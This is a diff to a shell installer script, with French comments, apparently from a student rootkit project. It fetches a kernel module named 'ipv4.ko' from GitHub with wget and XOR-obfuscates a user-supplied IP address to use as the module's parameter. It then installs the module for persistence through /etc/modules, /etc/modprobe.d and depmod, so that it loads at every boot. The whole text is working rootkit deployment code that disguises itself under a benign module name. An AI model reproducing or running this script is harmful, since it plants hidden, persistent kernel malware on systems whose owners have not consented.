@@ -1,13 +1,38 @@
 #!/bin/ash
-# echo "0 0 0 0" > /proc/sys/kernel/printk DONT WORK AND USELESS
 
 # récuperer le .ko
 wget https://github.com/gobelinor/Rootkit-Project/raw/refs/heads/dev_tibo/mesmodules/ipv4.ko
 
+# ajout de ip personnalisé
+echo "Tape ton ip:"
+read IP_ADDR
+if [ -z "$IP_ADDR" ]; then
+  echo "ip adresse vide."
+  exit 1
+fi
+
+key=126
+
+# XOR chaque caractère de l'ip
+xor_encrypt() {
+    local input="$1"
+    local key="$2"
+    local result=""
+    for ((i=0; i<${#input}; i++)); do
+        char="${input:i:1}"
+        xor_char=$(( $(printf '%d' "'$char") ^ key ))
+        result+=$(printf "%b" "$(printf "\\%03o" "$xor_char")")
+    done
+    echo -ne "$result"
+}
+
+# Appliquer le XOR et afficher les résultats
+encrypted=$(xor_encrypt "$IP_ADDR" "$key")
+
 # persistence (load le module au demarage)
 echo "ipv4" >> /etc/modules
 mkdir -p /lib/modules/$(uname -r)/extra
-echo "options ipv4 ip=172.31.28.1" > /etc/modprobe.d/ipv4.conf
+echo "options ipv4 ip=$encrypted" > /etc/modprobe.d/ipv4.conf
 cp ipv4.ko /lib/modules/$(uname -r)/extra/
 depmod -a
 
